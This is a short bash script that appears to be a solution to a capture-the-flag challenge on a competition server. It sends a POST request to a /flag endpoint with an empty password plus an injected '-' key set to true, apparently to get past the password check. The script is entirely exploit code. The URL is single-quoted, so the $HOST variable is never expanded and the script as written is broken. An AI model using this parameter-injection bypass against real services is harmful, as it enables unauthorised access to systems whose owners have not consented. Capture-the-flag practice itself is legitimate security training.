#!/bin/bash
set -ex

HOST="challs.nusgreyhats.org:33202"

curl 'http://$HOST/flag' -X POST -d '{"password":"", "-": true}'
